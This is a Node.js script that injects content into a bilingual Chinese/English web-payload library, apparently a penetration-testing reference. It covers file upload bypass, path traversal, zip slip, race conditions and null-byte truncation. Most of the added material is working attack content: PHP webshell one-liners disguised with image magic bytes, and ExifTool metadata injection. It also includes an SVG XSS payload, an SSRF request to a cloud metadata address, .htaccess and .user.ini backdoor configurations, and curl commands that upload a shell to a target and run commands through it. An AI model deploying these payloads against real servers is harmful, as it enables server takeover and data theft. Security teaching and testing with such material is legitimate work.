import { readFileSync, writeFileSync } from 'node:fs';

const filePath = 'src/data/webPayloads.ts';
let content = readFileSync(filePath, 'utf8');
const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
let changes = 0;

// Insert text after a unique anchor string
function insertAfter(anchor, insertion) {
  const idx = content.indexOf(anchor);
  if (idx < 0) { console.log('ANCHOR NOT FOUND:', anchor.slice(0, 60)); return false; }
  const pos = idx + anchor.length;
  content = content.slice(0, pos) + '\n' + insertion + content.slice(pos);
  return true;
}

// Find the NEXT payload ID marker after a given position
function findNextPayloadId(startPos) {
  const m = content.slice(startPos).match(/  \{[\r\n ]*id: '([^']+)'/);
  return m ? m[1] : null;
}

// ============================================================
// 1. ENRICH FILE-UPLOAD-BYPASS: Add attackChain, analysis, refs
// ============================================================
const ac = (zh, en, dzh, den) =>
  `      { title: { zh: '${zh}', en: '${en}' }, description: { zh: '${dzh}', en: '${den}' } },`;

const insertBefore = (marker, text) => {
  const idx = content.indexOf(marker);
  if (idx < 0) { console.log('MARKER NOT FOUND:', marker.slice(0, 60)); return false; }
  content = content.slice(0, idx) + text + '\n' + content.slice(idx);
  return true;
};

// --- file-upload-bypass: add before tutorial ---
const bypassTutorialMarker = `    tutorial: {
      overview: { zh: '文件上传绕过技术针对Web应用的文件上传防护机制，通过修改文件扩展名、MIME类型篡改、内容类型混淆、双扩展名、截断字符、图片马等方式绕过白名单/黑名单检测，最终上传可执行的恶意文件(如Webshell)获取服务器控制权'`;

const bypassExtra = `    attackChain: [
${ac('扩展名绕过探测','Extension bypass probe','尝试大小写混写、双扩展名、PHP 别名(.phtml/.pht/.phar/.php5)、分号拼接(.php;.jpg)、NTFS 流(::\\$DATA)、双写绕过和编辑器上传路径，全面探测黑名单覆盖盲区。','Try case variations, double extensions, PHP aliases, semicolon concatenation, NTFS ADS, double-write bypass, and editor upload paths to fully map blacklist coverage gaps.')}
${ac('Content-Type 伪造','Content-Type spoofing','将 Content-Type 改为 image/jpeg、image/png、image/gif 等白名单类型，结合 Content-Disposition 编码变体和分块传输测试 MIME 层校验。','Change Content-Type to allowlisted types and combine with Content-Disposition encoding variants and chunked transfer to test MIME-layer validation.')}
${ac('魔术字节与图片马','Magic bytes and image webshells','在 PHP 代码前加 GIF89a/PNG/JPEG/BMP/PDF 文件头或使用 copy /b 合成图片马；通过 ExifTool 元数据注入和 SVG 事件注入扩展攻击面。','Prepend GIF89a/PNG/JPEG/BMP/PDF headers or use copy /b for image webshells; extend attack surface via ExifTool metadata injection and SVG event injection.')}
${ac('平台解析特性','Platform parser quirks','利用 IIS 分号截断(.asp;.jpg)、Apache .htaccess AddType 覆盖、Nginx 空字节截断(CVE-2013-4547)和 NTFS ADS 突破平台级限制。','Exploit IIS semicolon truncation, Apache .htaccess AddType override, Nginx null-byte truncation, and NTFS ADS to break platform-level restrictions.')}
${ac('验证 WebShell 可执行','Verify WebShell execution','访问上传文件 URL 确认代码是否解析；若被拦截尝试 .htaccess/.user.ini 覆盖目录规则或通过 zip/phar 伪协议引用图片马。','Access uploaded file URL to confirm code parsing; if blocked, override directory rules via .htaccess/.user.ini or reference image shell via zip/phar pseudo-protocols.')}
    ],
    analysis: { zh: '文件上传绕过本质是利用验证链的不一致性：黑名单覆盖不全(PHP 变体扩展名)、MIME 头与内容校验分离、平台解析差异(IIS/Apache/Nginx)、客户端验证可绕过。攻击者只需找到一个未被拦截的扩展名+MIME+内容组合，即可将 WebShell 写入目标。', en: 'File upload bypass exploits validation chain inconsistency: incomplete extension blacklists, MIME-vs-content check separation, platform parsing differences, and bypassable client-side validation. One unblocked combination of extension, MIME type, and content is sufficient to land a WebShell.' },
    references: [
      'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload',
      'https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html',
      'https://portswigger.net/web-security/file-upload',
      'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files',
    ],
`;

if (insertBefore(bypassTutorialMarker, bypassExtra)) {
  console.log('DONE file-upload-bypass enrichment');
  changes++;
}

// ============================================================
// 2. ENRICH file-download through file-null-byte
// ============================================================
const remaining = [
  {
    id: 'file-download',
    ac: [
      ac('识别文件下载接口','Identify download endpoint','通过代理历史和 JS 分析定位接受文件路径参数的下载接口，确认参数名、响应类型和路径规范形式。','Locate download endpoints through proxy history and JS analysis; confirm parameter names, response types, and path conventions.'),
      ac('路径遍历测试','Path traversal testing','使用 ../、..%2f、..%252f 等编码变体尝试读取 /etc/passwd、web.config 等系统文件，测试路径穿越层数(3-10层)。','Use ../, ..%2f, ..%252f encodings to read /etc/passwd, web.config, and other system files; test traversal depth (3-10 levels).'),
      ac('源码与配置提取','Source and config extraction','下载应用源码、数据库配置(.env/web.config)、密钥文件，提取凭据和连接字符串用于后续攻击。','Download source code, database configs, and key files to extract credentials and connection strings for further attacks.'),
      ac('自动化批量探测','Automated bulk probing','使用敏感文件字典(wfuzz/ffuf)批量测试常见路径，扩大攻击面提高发现率。','Use sensitive file dictionaries (wfuzz/ffuf) to bulk-test common paths, expanding attack surface and discovery rate.'),
    ],
    analy: { zh: '任意文件下载因路径拼接未校验或目录白名单缺失导致。攻击者通过路径遍历读取任意文件——从 /etc/passwd、应用源码到 .env 配置文件均可被窃取。这是信息收集阶段的高危漏洞，常为后续 RCE 或横向移动铺路。', en: 'Arbitrary file download results from unvalidated path concatenation or missing directory allowlists. Attackers read arbitrary files via path traversal, from /etc/passwd to source code and .env configs. This high-risk info disclosure often paves the way for RCE or lateral movement.' },
    refs: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion','https://portswigger.net/web-security/file-path-traversal'],
  },
  {
    id: 'file-competition',
    ac: [
      ac('识别竞态窗口','Identify race window','确认文件处理流程：是否先存储再校验、是否先写入再检查——找出检查与使用之间的时间间隙。','Identify the file processing flow: store-then-validate or write-then-check — find the time gap between inspection and usage.'),
      ac('编写并发脚本','Write concurrent script','使用 Python threading/asyncio 同时发起大量上传和访问请求，在文件被删除前抢先执行 WebShell。','Use Python threading/asyncio to simultaneously send upload and access requests, executing the WebShell before server-side deletion.'),
      ac('调优并发参数','Tune concurrency','调整线程数(10-50)、请求间隔(0-100ms)和 payload 大小，最大化命中竞态窗口的概率。','Adjust thread count (10-50), request interval (0-100ms), and payload size to maximize race window hit probability.'),
      ac('.htaccess 竞态写入','.htaccess race write','竞态上传 .htaccess 覆盖目录解析规则，使后续上传的图片被当作 PHP 执行。','Race-upload .htaccess to override directory parsing rules, causing subsequently uploaded images to execute as PHP.'),
    ],
    analy: { zh: '条件竞争利用文件处理流程中的时间窗口——当服务端先存储再校验、或校验和删除之间存在间隙时，攻击者可在安全检查完成前抢先访问文件。高并发场景下多线程请求可显著提高命中率。', en: 'Race conditions exploit timing windows in file processing — when servers store before validation or a gap exists between check and deletion. High-concurrency multi-threaded requests significantly improve the hit rate.' },
    refs: ['https://portswigger.net/web-security/file-upload#exploiting-file-upload-race-conditions','https://owasp.org/www-community/attacks/Race_Condition'],
  },
  {
    id: 'file-traversal',
    ac: [
      ac('基础路径遍历','Basic path traversal','使用 ../ 序列读取 Web 根目录外文件，测试 3-10 层深度和不同操作系统路径分隔符。','Use ../ sequences to read files outside web root; test 3-10 level depth and OS-specific path separators.'),
      ac('编码绕过过滤','Encoding filter bypass','当 ../ 被过滤时使用 URL 编码(..%2f)、双重编码(..%252f)、Unicode 变体(..%c0%af)、双写(....//)和空字节截断绕过。','When ../ is filtered, use URL encoding, double encoding, Unicode variants, double-write, and null-byte truncation to bypass.'),
      ac('平台特定路径','Platform-specific paths','Linux: /etc/passwd, /proc/self/environ; Windows: C:\\windows\\win.ini, SAM; Java: WEB-INF/web.xml。','Linux: /etc/passwd, /proc/self/environ; Windows: C:\\windows\\win.ini, SAM; Java: WEB-INF/web.xml.'),
      ac('路径遍历升级 RCE','Path traversal to RCE','通过读取日志文件、SSH 密钥、源码凭据，或结合文件上传和日志投毒将路径遍历升级为代码执行。','Escalate to RCE by reading log files, SSH keys, source credentials, or combining with file upload and log poisoning.'),
    ],
    analy: { zh: '路径遍历因应用构建文件路径时未充分校验用户输入导致。虽然看似只是信息泄露，但实战中常通过读取配置文件、私钥、源码获取凭据，进而实现权限提升或代码执行。', en: 'Path traversal occurs when applications insufficiently validate user input in file path construction. While appearing as mere info disclosure, it often yields credentials from configs, private keys, and source code for privilege escalation or code execution.' },
    refs: ['https://owasp.org/www-community/attacks/Path_Traversal','https://portswigger.net/web-security/file-path-traversal'],
  },
  {
    id: 'file-zip-slip',
    ac: [
      ac('探测压缩包功能','Probe archive functionality','确认目标是否接受 ZIP/TAR 上传并自动解压，观察解压后文件路径和访问方式。','Confirm whether the target accepts ZIP/TAR uploads with auto-extraction; observe extracted file paths and access.'),
      ac('构造恶意压缩包','Craft malicious archive','使用 evilarc 或 Python zipfile 创建含路径遍历文件名(../../shell.php)的压缩包。','Use evilarc or Python zipfile to create archives with path-traversal filenames (../../shell.php).'),
      ac('上传并验证写入','Upload and verify write','上传恶意压缩包后检查 Web 可访问目录是否被写入文件，确认 WebShell URL。','After upload, check whether files were written to web-accessible directories and confirm the WebShell URL.'),
      ac('TAR/多格式变体','TAR and multi-format variants','尝试 TAR、GZ、BZ2 等格式以及符号链接攻击变体，扩大利用面。','Try TAR, GZ, BZ2 formats and symlink attack variants to expand the exploitation surface.'),
    ],
    analy: { zh: 'Zip Slip 通过恶意压缩包中的路径遍历文件名将文件写入任意目录。当应用解压用户上传的压缩包时未校验内部文件名中的 ../ 序列，攻击者可将 WebShell 写入 Web 根目录甚至覆盖系统文件。', en: 'Zip Slip writes files to arbitrary directories via path-traversal filenames in malicious archives. When applications extract archives without validating ../ sequences, attackers can write WebShells to the web root or overwrite system files.' },
    refs: ['https://github.com/snyk/zip-slip-vulnerability','https://snyk.io/research/zip-slip-vulnerability'],
  },
  {
    id: 'file-mime',
    ac: [
      ac('探测类型检查机制','Probe type check mechanism','上传正常图片确认允许的 MIME 类型，同时尝试上传 .php 文件观察拦截行为，判断是检查 Content-Type 头还是文件内容。','Upload normal images to confirm allowed MIME types; try uploading .php to observe blocking and determine Content-Type vs content-based checks.'),
      ac('MIME 伪造上传','MIME spoofing upload','将 Content-Type 改为 image/jpeg/png/gif/webp/bmp 等所有图片类 MIME，测试服务端是否仅依赖客户端声明。','Change Content-Type to all image-type MIME values to test whether the server relies solely on client-declared MIME.'),
      ac('魔术字节伪造','Magic byte forgery','在 WebShell 前添加 GIF89a/PNG/JPEG/BMP/PDF/ZIP/TIFF/RIFF/GZIP/7z 等十种合法文件头绕过内容检测。','Prepend ten types of legitimate file headers (GIF/PNG/JPEG/BMP/PDF/ZIP/TIFF/RIFF/GZIP/7z) before the WebShell to bypass content detection.'),
      ac('验证文件可执行','Verify file is executable','访问上传文件确认是否被服务器解析，若为图片扩展名则结合解析漏洞或 .htaccess 覆盖实现代码执行。','Access the uploaded file to confirm server parsing; if saved as image, combine with parsing bugs or .htaccess override for execution.'),
    ],
    analy: { zh: 'MIME 绕过针对仅校验 Content-Type 或文件扩展名而不检查实际内容的上传机制。攻击者只需将 Content-Type 改为白名单值并添加合法文件头魔术字节，即可绕过大多数浅层校验。', en: 'MIME bypass targets upload mechanisms that only validate Content-Type or extension without inspecting content. Simply changing Content-Type to allowlisted values and prepending magic bytes defeats most shallow checks.' },
    refs: ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload','https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html'],
  },
  {
    id: 'file-null-byte',
    ac: [
      ac('环境检测','Environment detection','确认目标 PHP 版本(<5.3.4 存在原生空字节截断)或其他语言的空字节处理行为。','Confirm target PHP version (native null-byte truncation in <5.3.4) or null-byte handling in other languages.'),
      ac('上传空字节截断','Upload null-byte truncation','在文件名注入 %00 或 \\x00(shell.php%00.jpg)，使后端校验时看到 .jpg 但文件系统保存为 .php。','Inject %00 or \\x00 in filenames so the backend sees .jpg during validation but the filesystem saves as .php.'),
      ac('包含空字节截断','Include null-byte truncation','在 LFI 参数尾追加 %00(/etc/passwd%00)绕过 .php/.html 后缀强制拼接。','Append %00 to LFI parameters to bypass forced .php/.html suffix concatenation.'),
      ac('现代替代方案','Modern alternatives','当空字节被修复后改用路径长度截断、Unicode 特殊字符、竞争条件等替代技术。','When null-byte is patched, switch to path length truncation, special Unicode characters, or race conditions.'),
    ],
    analy: { zh: '空字节截断利用 C 字符串以 \\x00 结尾的特性——PHP 调用底层 C 函数处理文件名时 %00 后字符被截断，验证时看到 .jpg 实际保存 .php。现代 PHP(>=5.3.4)已修复，但老旧系统仍受影响。', en: 'Null-byte truncation exploits C-string null termination — when PHP calls C functions, characters after %00 are truncated. The validator sees .jpg while the filesystem saves .php. Modern PHP is patched but legacy systems remain vulnerable.' },
    refs: ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload','https://portswigger.net/web-security/file-upload'],
  },
];

for (const p of remaining) {
  const acText = p.ac.join('\n');
  const refText = '    references: [\n' + p.refs.map(r => `      '${r}',`).join('\n') + '\n    ],';
  const analyText = `    analysis: { zh: '${p.analy.zh.replace(/'/g, "\\'")}', en: '${p.analy.en.replace(/'/g, "\\'")}' },`;
  const extra = `    attackChain: [\n${acText}\n    ],\n${analyText}\n${refText}\n`;

  // Find tutorial: { for this specific payload
  const idPattern = new RegExp(`id: '${esc(p.id)}',[\\s\\S]*?(    tutorial: \\{)`, 'm');
  const match = content.match(idPattern);
  if (!match) { console.log('SKIP', p.id, '- no tutorial found'); continue; }

  const oldText = match[0];
  const newText = oldText.replace('    tutorial: {', extra + '    tutorial: {');
  content = content.replace(oldText, newText);
  console.log('DONE', p.id);
  changes++;
}

// ============================================================
// 3. ENRICH EXECUTION COMMANDS with dictionary content
// ============================================================

// Helper: find and replace execution array for a specific payload
function enrichExecCommands(payloadId, newExecEntries) {
  // Find the payload
  const idIdx = content.indexOf(`id: '${payloadId}'`);
  if (idIdx < 0) { console.log('EXEC SKIP', payloadId, '- not found'); return false; }

  // Find execution: [ for this payload
  const execIdx = content.indexOf('execution: [', idIdx);
  if (execIdx < 0) { console.log('EXEC SKIP', payloadId, '- no execution'); return false; }

  // Find the end of execution array by matching brackets
  let depth = 0, inStr = false, strChar = '';
  let endIdx = execIdx + 13; // skip 'execution: ['
  for (let i = endIdx; i < content.length; i++) {
    const c = content[i];
    if (inStr) {
      if (c === strChar && content[i-1] !== '\\' && content[i-1] !== "'" ) inStr = false;
      else if (c === strChar && i > 0 && content[i-1] === '\\') {} // escaped
      continue;
    }
    if (c === "'" || c === '"' || c === '`') { inStr = true; strChar = c; continue; }
    // Handle template backtick nested braces
    if (c === '[') depth++;
    if (c === ']') {
      if (depth === 0) { endIdx = i + 1; break; }
      depth--;
    }
  }

  const newExec = `execution: [\n${newExecEntries}\n    ]`;
  content = content.slice(0, execIdx) + newExec + content.slice(endIdx);
  return true;
}

// --- file-upload-bypass: enrich execution commands ---
const e = (zh, en, cmd, dzh, den, plat = 'all', sb = []) => {
  let sbText = '';
  if (sb.length) {
    sbText = '        syntaxBreakdown: [\n' + sb.map(b =>
      `          { part: '${b.part}', explanation: { zh: '${b.zh}', en: '${b.en}' }, type: '${b.type}' },`
    ).join('\n') + '\n        ]';
  }
  return `      {
        title: { zh: '${zh}', en: '${en}' },
        command: \`${cmd}\`,
        description: { zh: '${dzh}', en: '${den}' },
        platform: '${plat}',${sbText ? '\n' + sbText + '\n      },' : '\n      },'}`;
};

const bypassExec = [
  e('1. 扩展名绕过（完整版）','1. Extension bypass (complete)',
`# === PHP 扩展名变体 ===
shell.php .PHP .Php .pHp  shell.php3 .php4 .php5 .php7 .php8
shell.phtml .phtm .pht .phar .phps .phpt .pgif .inc

# 双扩展名:
shell.php.jpg  shell.php.png  shell.php.gif  shell.jpg.php
shell.php.html  shell.php.txt  shell.php.bmp  shell.php.svg

# 分号拼接 (IIS 6.0):
shell.php;.jpg  shell.php;.png  shell.php;.txt
shell.asp;.jpg  shell.aspx;.jpg  shell.cer;.jpg  shell.cdx;.jpg

# 空字节截断:
shell.php%00.jpg  shell.php\\\\x00.jpg  shell.php%00.png

# 换行/空格注入:
shell.php%0a  shell.php%0d%0a  shell.php%09.jpg  shell.php%20

# 大小写混写:
shell.pHp  shell.pHP5  shell.PhP  shell.PHP5

# NTFS ADS (Windows):
shell.php::\\\\$DATA  shell.php::\\\\$DATA.jpg
shell.php:evil.php  shell.php:evil.txt:\\\\$DATA

# 双写绕过:
shell.pphphp  shell.pHPhp  shell.phphpp
shell.asaspp  shell.jjspsp

# ASP/ASPX:
shell.asp .aspx .asa .asax .ascx .ashx .asmx
shell.cer .cdx .cshtml .vbhtml

# JSP/Java:
shell.jsp .jspx .jsw .jsv .jspf
shell.jsp;.jpg  shell.jsp%00.jpg  shell.war  shell.jar

# 其他服务端:
shell.py .rb .pl .cgi .sh .cfm .cfc .lua .go
shell.ps1 .bat .cmd .vbs

# 编辑器上传路径探测:
/kindeditor/attached/file/  /ueditor/php/upload/image/
/ckeditor/upload/  /fckeditor/editor/filemanager/upload/php/
/wangEditor/upload/  /tinymce/upload/`,
    'PHP/ASP/JSP/其他服务端扩展名变体全覆盖——大小写混写、双扩展名、分号拼接(IIS)、空字节截断、NTFS ADS、双写绕过、换行/空格/制表符注入、编辑器上传路径探测',
    'Complete extension variant coverage — case mixing, double extensions, semicolon (IIS), null-byte, NTFS ADS, double-write, whitespace injection, and editor upload path discovery',
    'all',
    [
      { part: '.phtml .pht .phar .php5 .php7', zh: 'PHP 别名扩展名（黑名单常见盲区）', en: 'PHP alias extensions (common blacklist blind spots)', type: 'value' },
      { part: '.php;.jpg .asp;.jpg', zh: '分号拼接绕过 (IIS 6.0 解析特性)', en: 'Semicolon concatenation (IIS 6.0 parser behavior)', type: 'technique' },
      { part: '%00 \\\\x00', zh: '空字节截断 (PHP<5.3.4 底层 C 函数)', en: 'Null-byte truncation (PHP<5.3.4 C-level)', type: 'encoding' },
      { part: '::\\\\$DATA', zh: 'NTFS 备用数据流 (Windows)', en: 'NTFS alternate data stream (Windows)', type: 'technique' },
      { part: '.pphphp .asaspp', zh: '双写绕过 (删除敏感后缀后仍保留)', en: 'Double-write bypass (survives suffix removal)', type: 'technique' },
      { part: '.asp .aspx .jsp .war', zh: '非 PHP 服务端扩展名', en: 'Non-PHP server-side extensions', type: 'value' },
      { part: '/kindeditor/ /ueditor/', zh: '常见编辑器上传路径', en: 'Common editor upload paths', type: 'path' },
    ]
  ),
  e('2. Content-Type 绕过（完整版）','2. Content-Type bypass (complete)',
`# 图片类型:
image/jpeg  image/png  image/gif  image/bmp  image/webp  image/tiff
image/x-icon  image/svg+xml  image/pjpeg  image/jpg  image/x-png

# 通用二进制:
application/octet-stream  application/zip  application/x-rar-compressed
application/x-7z-compressed  application/x-tar  application/gzip

# 文档类型:
application/pdf  application/xml  application/json  application/xhtml+xml
text/plain  text/html  text/xml  text/css

# 脚本类型 (探测服务端处理):
application/javascript  text/javascript
application/x-httpd-php  application/x-php  text/php

# 多媒体:
video/mp4  audio/mpeg  audio/wav  audio/ogg

# Content-Disposition 变体:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename="shell.p\\x68p"

# 分块传输 (绕过 WAF):
Transfer-Encoding: chunked`,
    '所有常见 Content-Type 值 + Content-Disposition 编码变体 + 分块传输，全面探测服务端 MIME 校验策略',
    'All common Content-Type values + Content-Disposition encoding variants + chunked transfer for comprehensive MIME validation probing',
    'all',
    [
      { part: 'image/jpeg image/png image/gif', zh: '标准图片 MIME（白名单常见值）', en: 'Standard image MIME types (common allowlist values)', type: 'header' },
      { part: 'image/webp image/bmp image/tiff', zh: '非主流图片类型（可能未被检查）', en: 'Less common image types (may not be checked)', type: 'header' },
      { part: 'application/octet-stream', zh: '通用二进制流（绕过类型检测）', en: 'Generic binary stream (bypass type checks)', type: 'header' },
      { part: 'filename*=UTF-8', zh: 'RFC 5987 文件名编码（可能绕过检测）', en: 'RFC 5987 filename encoding (may bypass detection)', type: 'technique' },
      { part: 'Transfer-Encoding: chunked', zh: '分块传输编码（绕过 WAF 流检测）', en: 'Chunked transfer encoding (bypass WAF stream inspection)', type: 'header' },
    ]
  ),
  e('3. 图片马与魔术字节','3. Image webshell & magic bytes',
`# Windows copy /b 合成:
copy normal.jpg/b + shell.php/a webshell.jpg
copy normal.png/b + shell.php/a webshell.png

# 魔术字节 + PHP 一句话:
GIF89a;<?php system($_GET["cmd"]); ?>
GIF89a<?php system($_GET["cmd"]);?>
GIF89a<?php eval($_POST['cmd']);?>
\\\\x89PNG\\\\r\\\\n\\\\x1a\\\\n<?php system($_GET["cmd"]); ?>
\\\\xff\\\\xd8\\\\xff\\\\xe0<?php system($_GET["cmd"]); ?>
BM<?php system($_GET["cmd"]); ?>
%PDF-1.4<?php system($_GET["cmd"]); ?>

# ExifTool 注入:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' avatar.png

# SVG XSS/SSRF:
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>`,
    '六种魔术字节(GIF/PNG/JPEG/BMP/PDF)预处理、ExifTool 元数据注入、SVG 事件注入和 SSRF',
    'Six magic byte types (GIF/PNG/JPEG/BMP/PDF) prepend, ExifTool metadata injection, SVG event injection and SSRF',
    'all',
    [
      { part: 'GIF89a;', zh: 'GIF 魔术字节——最常用绕过标记', en: 'GIF magic bytes — most common bypass marker', type: 'encoding' },
      { part: 'copy /b', zh: 'Windows 二进制文件合并命令', en: 'Windows binary file merge command', type: 'command' },
      { part: 'exiftool -Comment=', zh: 'ExifTool 元数据注入', en: 'ExifTool metadata injection', type: 'command' },
      { part: '<svg ... onload=', zh: 'SVG 事件注入——独立攻击向量', en: 'SVG event injection — independent attack vector', type: 'tag' },
    ]
  ),
  e('4. .htaccess / .user.ini 配置上传','4. .htaccess / .user.ini config upload',
`# === Apache .htaccess ===
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddHandler php5-script .jpg
AddHandler php-script .jpg
SetHandler application/x-httpd-php
<FilesMatch "\\\\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>

# === PHP-FPM .user.ini ===
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg

# === Nginx 截断 (CVE-2013-4547) ===
# 上传 shell.jpg[0x20][0x0a].php → Nginx 截断为 shell.jpg 但按 PHP 执行`,
    '上传服务端配置文件覆盖目录解析规则：Apache .htaccess AddType/AddHandler、PHP-FPM .user.ini auto_prepend_file、Nginx 文件名截断',
    'Upload server config files to override directory parsing: Apache .htaccess AddType/AddHandler, PHP-FPM .user.ini auto_prepend_file, Nginx filename truncation',
    'linux',
    [
      { part: 'AddType application/x-httpd-php', zh: 'Apache 指令：将扩展名映射到 PHP MIME', en: 'Apache directive: map extension to PHP MIME', type: 'technique' },
      { part: 'auto_prepend_file=shell.jpg', zh: 'PHP-FPM 指令：每页加载前自动包含后门', en: 'PHP-FPM directive: auto-include backdoor before every page load', type: 'technique' },
      { part: 'CVE-2013-4547', zh: 'Nginx 文件名解析漏洞', en: 'Nginx filename parsing vulnerability', type: 'value' },
    ]
  ),
  e('5. NTFS 流与平台解析特性','5. NTFS stream & platform parser quirks',
`# === Windows NTFS ADS ===
filename="shell.php::\\\\$DATA"
filename="shell.php::\\\\$DATA.jpg"
filename="shell.php::INDEX_ALLOCATION"
filename="shell.php:evil.php:\\\\$DATA"

# === IIS 6.0 分号截断 ===
filename="shell.asp;.jpg"
filename="shell.aspx;.jpg"
filename="shell.asa;.jpg"
filename="shell.cer;.jpg"

# === IIS 7.0+ 路径解析 ===
# 上传 shell.jpg → 访问 http://target.com/uploads/shell.jpg/.php

# === Apache 多后缀回溯 ===
# shell.php.jpg → 若 .jpg 不可识别，回溯解析 .php

# === 空格/点号截断 (Windows) ===
filename="shell.php "
filename="shell.php."
filename="shell.php..."
filename="shell.php .jpg"

# === IIS + .htaccess 集成 (Windows Apache) ===`,
    'Windows NTFS ADS、IIS 分号截断/路径解析、Apache 多后缀回溯、Windows 空格/点号自动去除等平台特有绕过技术',
    'Platform-specific bypasses: Windows NTFS ADS, IIS semicolon/path parsing, Apache multi-suffix fallback, Windows auto-trim of trailing spaces/dots',
    'all',
    [
      { part: '::\\\\$DATA', zh: 'NTFS 备用数据流——Windows 自动忽略此后缀', en: 'NTFS ADS — Windows auto-ignores this suffix', type: 'technique' },
      { part: '.asp;.jpg', zh: 'IIS 6.0 分号截断——仅解析分号前部分', en: 'IIS 6.0 semicolon truncation', type: 'technique' },
      { part: 'shell.jpg/.php', zh: 'IIS 7.0+ 路径解析（特定配置）', en: 'IIS 7.0+ path parsing (specific config)', type: 'technique' },
      { part: 'shell.php .jpg', zh: 'Windows 尾随空格自动去除', en: 'Windows trailing space auto-removal', type: 'technique' },
    ]
  ),
];

console.log('Enriching file-upload-bypass exec commands...');
if (enrichExecCommands('file-upload-bypass', bypassExec.join('\n'))) changes++;

// --- file-mime: enrich execution ---
const mimeExec = [
  e('1. Content-Type 全量探测','1. Full Content-Type probe',
`# 正常上传基线:
curl -F "file=@test.jpg;type=image/jpeg" "http://target.com/upload"
curl -F "file=@test.png;type=image/png" "http://target.com/upload"

# PHP 文件 + 每种 Content-Type:
curl -F "file=@shell.php;type=image/jpeg;filename=test.jpg" "http://target.com/upload"
curl -F "file=@shell.php;type=image/png;filename=test.png" "http://target.com/upload"
curl -F "file=@shell.php;type=image/gif;filename=test.gif" "http://target.com/upload"
curl -F "file=@shell.php;type=image/bmp;filename=test.bmp" "http://target.com/upload"
curl -F "file=@shell.php;type=image/webp;filename=test.webp" "http://target.com/upload"
curl -F "file=@shell.php;type=image/tiff;filename=test.tif" "http://target.com/upload"
curl -F "file=@shell.php;type=image/x-icon;filename=test.ico" "http://target.com/upload"
curl -F "file=@shell.php;type=image/svg+xml;filename=test.svg" "http://target.com/upload"

# 其他类型:
curl -F "file=@shell.php;type=application/octet-stream;filename=test.bin" "http://target.com/upload"
curl -F "file=@shell.php;type=application/zip;filename=test.zip" "http://target.com/upload"
curl -F "file=@shell.php;type=application/pdf;filename=test.pdf" "http://target.com/upload"
curl -F "file=@shell.php;type=text/plain;filename=test.txt" "http://target.com/upload"
curl -F "file=@shell.php;type=video/mp4;filename=test.mp4" "http://target.com/upload"
curl -F "file=@shell.php;type=audio/mpeg;filename=test.mp3" "http://target.com/upload"

# 双扩展名 + MIME 组合:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.jpg" "http://target.com/upload"`,
    '使用全部常见 Content-Type 值系统化探测服务端 MIME 校验策略——正常基线、类型伪造、双扩展名组合',
    'Systematic probe of server-side MIME validation using all common Content-Type values — baseline, type spoofing, and double-extension combos',
    'all',
    [
      { part: 'image/jpeg image/png image/gif', zh: '标准白名单类型（应正常通过）', en: 'Standard allowlist types (should pass)', type: 'header' },
      { part: 'image/webp image/bmp image/tiff', zh: '较少见图片类型（可能未过滤）', en: 'Less common image types (may not be filtered)', type: 'header' },
      { part: 'application/octet-stream', zh: '通用二进制（常被接受）', en: 'Generic binary (often accepted)', type: 'header' },
      { part: 'video/mp4 audio/mpeg', zh: '多媒体类型（可能绕过图片检查）', en: 'Multimedia types (may bypass image checks)', type: 'header' },
    ]
  ),
  e('2. Magic Bytes 全量伪造','2. Full magic byte forgery',
`# GIF89a (最常用):
printf 'GIF89a;' > shell.gif.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.gif.php

# GIF87a:
printf 'GIF87a;' > shell.gif.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.gif.php

# PNG:
printf '\\\\x89PNG\\\\r\\\\n\\\\x1a\\\\n' > shell.png.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.png.php

# JPEG:
printf '\\\\xff\\\\xd8\\\\xff\\\\xe0' > shell.jpg.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg.php

# BMP:
printf 'BM' > shell.bmp.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.bmp.php

# PDF:
printf '%%PDF-1.4' > shell.pdf.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.pdf.php

# ZIP (PK):
printf 'PK\\\\x03\\\\x04' > shell.zip.php

# TIFF (Little/Big Endian):
printf 'II\\\\x2a\\\\x00' > shell.tif.php
printf 'MM\\\\x00\\\\x2a' > shell.tif.php

# RIFF (WebP/AVI):
printf 'RIFF' > shell.webp.php

# GZIP:
printf '\\\\x1f\\\\x8b\\\\x08' > shell.gz.php

# 7z:
printf "7z\\\\xbc\\\\xaf\\\\x27\\\\x1c" > shell.7z.php

# 上传测试:
curl -F "file=@shell.gif.php;type=image/gif;filename=avatar.gif" "http://target.com/upload"
curl "http://target.com/uploads/avatar.gif?cmd=id"`,
    '十种文件头魔术字节(GIF89a/GIF87a/PNG/JPEG/BMP/PDF/ZIP/TIFF/RIFF/GZIP/7z)伪造，覆盖所有常见文件格式的内容检测绕过',
    'Ten file header magic byte forgeries covering all common format content-based detection bypasses',
    'all',
    [
      { part: 'GIF89a; GIF87a;', zh: 'GIF 格式魔术字节（最常用）', en: 'GIF format magic bytes (most common)', type: 'encoding' },
      { part: '\\\\x89PNG\\\\r\\\\n\\\\x1a\\\\n', zh: 'PNG 文件头 (8 字节)', en: 'PNG header (8 bytes)', type: 'encoding' },
